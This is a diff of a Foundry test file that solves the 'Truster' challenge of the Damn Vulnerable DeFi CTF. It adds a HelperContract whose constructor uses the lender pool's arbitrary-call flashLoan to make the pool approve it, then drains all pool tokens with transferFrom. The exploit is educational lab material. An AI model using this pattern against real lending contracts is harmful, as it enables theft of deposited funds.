@@ -51,12 +51,7 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        bytes memory approveData = abi.encodeWithSignature("approve(address,uint256)", player, TOKENS_IN_POOL);
-        // Approve player to transfer from pool 1_000_000e18 tokens
-        pool.flashLoan(0, player, address(token), approveData);
-        // Transfer from pool to recovery account
-        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
-        vm.setNonce(player, 1);
+        new HelperContract(pool, recovery, token, TOKENS_IN_POOL);
     }
 
     /**
@@ -69,5 +64,16 @@ contract TrusterChallenge is Test {
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract HelperContract {
+    constructor(TrusterLenderPool pool, address recovery, DamnValuableToken token, uint256 TOKENS_IN_POOL) {
+        // Data to approve player to transfer from pool 1_000_000e18 tokens
+        bytes memory approveData = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
+        // FL where approval will happen
+        pool.flashLoan(0, address(this), address(token), approveData);
+        // Transfer from pool to recovery account
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
     }
 }
